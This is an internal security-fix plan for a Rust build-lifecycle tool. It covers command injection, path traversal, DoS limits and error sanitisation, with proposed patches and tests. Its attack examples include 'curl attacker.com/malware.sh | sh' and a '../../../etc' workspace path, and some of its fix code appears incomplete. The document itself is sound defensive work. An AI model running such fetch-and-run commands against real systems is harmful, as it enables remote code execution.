# Critical Security Fixes Required for Production

**Status**: 🔴 **BLOCKING PRODUCTION DEPLOYMENT**
**Date**: 2025-10-11
**Priority**: P0 - Immediate Action Required

---

## Summary

The lifecycle system has **3 CRITICAL** and **8 HIGH** severity vulnerabilities that must be fixed before any production deployment. Primary concerns are **command injection** and **path traversal** attacks.

**Full Report**: See [SECURITY_REVIEW.md](./SECURITY_REVIEW.md)

---

## 🔴 P0: Fix Within 48 Hours (Critical)

### 1. Command Injection (CVSS 9.8) - RCE Risk
**File**: `/src/lifecycle/exec.rs:253-283`

**Issue**: Shell execution allows arbitrary code execution:
```rust
// ❌ VULNERABLE
let mut c = Command::new("sh");
c.arg("-c");  // Executes ANY shell command from TOML
command.current_dir(cwd).arg(cmd);  // No validation!
```

**Attack Example**:
```toml
[lifecycle.build]
command = "curl attacker.com/malware.sh | sh"
```

**Fix Required**:
```rust
// ✅ SECURE - Use allowlist + no shell
fn execute_command_safe(cmd: &[&str], cwd: &Path) -> Result<()> {
    let allowed = ["cargo", "npm", "make", "git"];
    if !allowed.contains(&cmd[0]) {
        return Err(LifecycleError::Other(format!("Not allowed: {}", cmd[0])));
    }

    Command::new(cmd[0])
        .args(&cmd[1..])  // No shell, direct execution
        .current_dir(cwd)
        .output()?;
}
```

**Estimated Effort**: 4 hours
**Testing Required**: Integration tests with malicious commands

---

### 2. Path Traversal (CVSS 8.6) - Arbitrary File Access
**File**: `/src/lifecycle/exec.rs:136-180`

**Issue**: Workspace paths not validated:
```rust
// ❌ VULNERABLE
let ws_path = ctx.root.join(&workspace.path);  // No validation!
let ws_make_path = ws_path.join("make.toml");
```

**Attack Example**:
```toml
[workspace.escape]
path = "../../../etc"  # Escape to /etc directory
```

**Fix Required**:
```rust
// ✅ SECURE - Canonicalize and validate
fn validate_workspace_path(root: &Path, ws_path: &Path) -> Result<PathBuf> {
    let canonical = std::fs::canonicalize(ws_path)?;
    let canonical_root = std::fs::canonicalize(root)?;

    if !canonical.starts_with(&canonical_root) {
        return Err(LifecycleError::WorkspacePath {
            workspace: ws_path.display().to_string(),
            path: canonical
        });
    }

    Ok(canonical)
}
```

**Estimated Effort**: 3 hours
**Testing Required**: Path traversal fuzzing

---

### 3. State File TOCTOU (CVSS 8.2) - Race Condition
**File**: `/src/lifecycle/state.rs:68-86`

**Issue**: ✅ **ALREADY FIXED** - Atomic write pattern implemented
```rust
// ✅ SECURE - Now uses atomic rename
let temp_path = path_ref.with_extension("json.tmp");
std::fs::write(&temp_path, json)?;
std::fs::rename(&temp_path, path_ref)?;  // Atomic!
```

**Status**: ✅ Complete (fixed by linter)

---

## 🟠 P1: Fix Within 1 Week (High Priority)

### 4. TOML Bomb DoS (CVSS 7.5)
**Fix**: Add file size limit
```rust
const MAX_TOML_SIZE: u64 = 1024 * 1024; // 1MB
let metadata = std::fs::metadata(path)?;
if metadata.len() > MAX_TOML_SIZE {
    return Err(LifecycleError::Other("TOML too large".into()));
}
```
**Estimated Effort**: 1 hour

---

### 5. Unbounded Parallel Execution (CVSS 7.3)
**Fix**: Limit rayon thread pool
```rust
use rayon::ThreadPoolBuilder;
let pool = ThreadPoolBuilder::new()
    .num_threads(num_cpus::get().min(8))
    .build()?;
```
**Estimated Effort**: 2 hours

---

### 6. Hook Recursion Stack Overflow (CVSS 7.1)
**Fix**: Add depth counter
```rust
const MAX_HOOK_DEPTH: usize = 10;
struct Context {
    hook_depth: Arc<AtomicUsize>,
}

fn run_phase(ctx: &Context, phase: &str) -> Result<()> {
    let depth = ctx.hook_depth.fetch_add(1, Ordering::SeqCst);
    if depth > MAX_HOOK_DEPTH {
        return Err(LifecycleError::Other("Hook too deep".into()));
    }
    // ... run phase
    ctx.hook_depth.fetch_sub(1, Ordering::SeqCst);
}
```
**Estimated Effort**: 3 hours

---

### 7. Error Message Information Disclosure (CVSS 6.8)
**Fix**: Sanitize error messages
```rust
#[error("Command failed in phase '{phase}' with exit code {exit_code}")]
CommandFailed {
    phase: String,
    // ✅ Removed: command, stderr (prevent credential leakage)
    exit_code: i32,
}
```
**Estimated Effort**: 2 hours

---

## Testing Requirements

### Security Test Suite:
```rust
#[test]
fn test_command_injection_blocked() {
    let cmd = "echo 'test' && curl malicious.com | sh";
    assert!(execute_command_safe(&cmd.split(" ").collect::<Vec<_>>(), Path::new(".")).is_err());
}

#[test]
fn test_path_traversal_blocked() {
    let ws_path = Path::new("../../../etc");
    assert!(validate_workspace_path(Path::new("/project"), ws_path).is_err());
}

#[test]
fn test_toml_size_limit() {
    let huge_toml = "x".repeat(10_000_000);
    assert!(load_make_from_str(&huge_toml).is_err());
}

#[test]
fn test_hook_depth_limit() {
    // Create circular hook dependency
    let make = Make {
        hooks: Some(Hooks {
            before_init: Some(vec!["setup".to_string()]),
            before_setup: Some(vec!["init".to_string()]),
            ..Default::default()
        }),
        ..Default::default()
    };
    assert!(run_phase(&ctx, "init").is_err());
}
```

---

## Implementation Timeline

| Priority | Task | Effort | Deadline |
|----------|------|--------|----------|
| P0 | Command injection fix | 4h | Day 1 |
| P0 | Path traversal fix | 3h | Day 1 |
| P0 | Security tests | 3h | Day 2 |
| P1 | TOML size limit | 1h | Week 1 |
| P1 | Parallel execution limit | 2h | Week 1 |
| P1 | Hook depth limit | 3h | Week 1 |
| P1 | Error sanitization | 2h | Week 1 |

**Total Effort**: ~18 hours (2-3 days of focused work)

---

## Verification Checklist

Before production deployment:
- [ ] All P0 fixes implemented and tested
- [ ] Security test suite passing (100% coverage on attack vectors)
- [ ] Fuzzing campaign completed (24-hour run)
- [ ] External security review completed
- [ ] Documentation updated with security best practices
- [ ] CI/CD security checks enabled (`cargo audit`, `cargo deny`)

---

## Resources

- **Full Security Review**: [SECURITY_REVIEW.md](./SECURITY_REVIEW.md)
- **OWASP Command Injection**: https://owasp.org/www-community/attacks/Command_Injection
- **CWE-78**: https://cwe.mitre.org/data/definitions/78.html
- **CWE-22**: https://cwe.mitre.org/data/definitions/22.html
- **Rust Security Guidelines**: https://anssi-fr.github.io/rust-guide/

---

## Contact

For security concerns, contact the security team immediately.

**DO NOT** deploy to production until all P0 issues are resolved.
